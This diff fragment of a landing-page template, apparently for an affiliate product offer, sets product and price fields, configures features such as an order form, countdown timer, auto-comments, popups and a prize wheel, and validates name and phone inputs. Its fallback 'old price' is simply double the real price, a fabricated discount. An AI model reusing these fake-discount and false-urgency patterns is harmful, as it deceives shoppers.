+    for (var i = 0; i < productName.length; i++) {
+        productName[i].innerHTML = offer_params.productName;
+    }
+    for (var i = 0; i < priceMain.length; i++) {
+        priceMain[i].innerHTML = offer_params.priceMain;
+    }
+
+
+    if(offer_params.customPriceOld){
+        for (var i = 0; i < priceOld.length; i++) {
+            priceOld[i].innerHTML = offer_params.customPriceOld;
+        }
+    }else{
+        for (var i = 0; i < priceOld.length; i++) {
+            priceOld[i].innerHTML = offer_params.priceMain * 2;
+        }
+    }
+
+
+    for (var i = 0; i < currencyMain.length; i++) {
+        currencyMain[i].innerHTML = offer_params.currencyMain;
+    }
+</script>
+
+
+<script>
+    var usr = '{t2}';
+    var sabss = '{clickid}';
+    initFeatures({
+        priceMain : offer_params.priceMain,
+        currencyMain : offer_params.currencyMain,
+        lang : 'fr', // список языков - vn, it, es, co, hr, en, de, fr, ph, cz, id, th, gr, bg, al, ro, sg, en_sg, mk, si, sk, lv, hu, pl, lt, pt
+        product : offer_params.productName, // название продукта
+        genderTargetting : 'all', // пол целевой аудитории - all, male, female
+
+
+
+
+        form : {
+            isNeeded : 1, // 1-включить форму, 0-выключить
+            img: 'prod.png', // путь до картинки продукта
+            price: true, // плашка с ценой
+            priceBrFix: true, // фиксит отображение цен в ценике (true - уберает перенос строки)
+            showSelect: false, // показывать или скрывать поле select
+            untilExpire: 600 // таймер окончания акции где 600 = 10мин. Ставим 0 если таймер не нужен.
+        },
+
+
+
+
+        autoComments: {
+            isNeeded: 0, // 1-включить автокомы, 0-выключить
+            bgColor: '#d7f2d8' // цвет фона блока комчиков
+        },
+
+
+
+
+        popups: {
+            isNeeded: 0, // 1-включить попы, 0-выключить
+            bgColor: 'rgba(87, 86, 141, 0.8)', // цвет фона сообщения
+            textColor: '#fff', // цвет основного текста сообщения
+            emphColor: 'cyan', // цвет выделений в сообщениях (например, 'со скидкой XX%', '' )
+            blackIcons: false // черные или белые иконки, значения true или false
+        },
+
+
+
+
+        wheel: {
+            isNeeded: 1, // 1-включить колесо, 0-выключить
+            customWheel: false // ссылка на свое колесо, либо false
+        }
+    });
+</script>
+<script>
+    $('[name="name"]').on('input change', function () {
+        var val = $(this).val();
+        $(this).val(val.replace(/[0-9+]/g, ''));
+    });
+    $('[name="name"]').attr('autocomplete', 'name');
+    $('[name="name"]').attr('pattern', '.{2,25}');
+    $('[name="phone"]').on('input change', function (e) {
+        var val = $(this).val();
+        $(this).val(val.replace(/[A-zА-яіїЁё ]/g, ''));
+    });
+    $('[name="phone"]').get(0).type = 'tel';
+    $('[name="phone"]').attr('autocomplete', 'tel');
+    $('[name="phone"]').attr('pattern', '.{6,18}')
+</script>
+</body>
+</html>
